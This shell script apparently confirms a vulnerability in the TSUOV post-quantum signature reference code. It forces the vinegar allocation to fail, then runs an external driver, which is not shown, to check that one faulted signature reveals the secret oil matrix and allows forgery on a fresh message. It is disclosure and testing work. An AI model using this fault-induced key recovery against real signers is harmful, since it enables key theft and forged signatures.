#!/bin/sh
# sign-31-8: TSUOV signing ignores a failed vinegar expansion, so the vinegar
# values come from stale stack bytes that hold public data, and one returned
# signature reveals the secret oil matrix.
#
# Checks that all six trees share the unchecked RejSampPRG_sm3/Expand_V code,
# then builds each reference level with malloc and pseudoXOF wrapped so that
# exactly one allocation (pseudoXOF's first, for the vinegar expansion) fails.
# TSUOV-128 and -256: the faulted call must return 0 with a valid signature,
# and an attacker using only pk and that signature must recover the oil matrix
# and forge a signature on a fresh message; the unfaulted control must not.
# TSUOV-512: the faulted call never returns (all-zero vinegars), checked with
# a timeout; availability only.
set -u
cd "$(dirname "$0")/.." || exit 2
command -v gcc >/dev/null 2>&1 || { echo 'SKIP sign-31-8: gcc unavailable'; exit 77; }
command -v timeout >/dev/null 2>&1 || { echo 'SKIP sign-31-8: timeout unavailable'; exit 77; }
bad() { echo "NOT CONFIRMED sign-31-8: $1"; exit 1; }

top=sign-31/Implementations
ref="$top/Digital_Signature-TSUOV-x86-Reference_Implementation/API_PKC/Implementations/Reference_Implementation"
opt="$top/Digital_Signature-TSUOV-x86-Performance_Optimized_Implementation/API_PKC/Implementations/Reference_Implementation"
for d in "$ref"/TSUOV_* "$opt"/TSUOV_*; do
    grep -Fq 'void RejSampPRG_sm3(MGF_CTX_s *ctx, const uint64_t index, const unsigned int length,' "$d/tsuov_core.c" &&
        grep -Fq '    pseudoXOF((unsigned long long)tau * 8, msg,' "$d/tsuov_core.c" &&
        grep -Fq '    RejSampPRG(ctx, 0, n3, TSUOV_kv_RS_LEN, r3);' "$d/tsuov_core.c" &&
        grep -Fq 'return MEMORY_ALLOCATION_FAILED;' "$d/auxfunc.c" ||
        bad "$d differs from the archive"
done
echo 'source: all six trees discard pseudoXOF status in RejSampPRG_sm3, used by Expand_V for the vinegars'

scratch=$(mktemp -d) || exit 2
trap 'rm -rf -- "$scratch"' EXIT HUP INT TERM
driver=$PWD/sign-31/reproduce_stale_vinegar.c
for level in 128 256 512; do
    mkdir "$scratch/$level" && cp "$ref/TSUOV_$level"/*.c "$ref/TSUOV_$level"/*.h "$scratch/$level/" || bad "copy failed"
    (cd "$scratch/$level" && gcc -O2 -std=c99 -w -I. -DTSUOV_VARIANT=$level \
        -Wl,--wrap=malloc -Wl,--wrap=pseudoXOF -o w "$driver" \
        SIG_AlgorithmInstance.c auxfunc.c drng.c tsuov_core.c mgf.c Fql.c -lm) \
        2>"$scratch/cc" || { cat "$scratch/cc"; bad "TSUOV-$level build failed"; }
    if [ "$level" = 512 ]; then
        out=$(timeout 30 "$scratch/$level/w" start 2>/dev/null); st=$?
        [ "$st" = 124 ] && [ "$out" = 'faulted signing started' ] || bad "TSUOV-512 behaviour differs (status $st)"
        echo 'TSUOV-512: faulted signing call did not return within 30 s (all-zero vinegars; no signature released)'
        continue
    fi
    out=$(timeout 120 "$scratch/$level/w" 2>/dev/null) || bad "TSUOV-$level run failed: $out"
    echo "TSUOV-$level: $out"
    case "$out" in
        'sign(m2, vinegar allocation fails)=0 verify(m2)=0 oil-matrix-solved=1 '*' forgery(m3)-verifies=1; control sign(m2)=0 verify(m2)=0 oil-matrix-solved=0 forgery(m3)-verifies=0') ;;
        *) bad "TSUOV-$level behaviour differs" ;;
    esac
done
echo 'ATTACK sign-31-8 TSUOV-128/256: one signature returned after the vinegar allocation fails reveals the oil matrix and gives a forgery on a fresh message; CONFIRMED'
exit 0
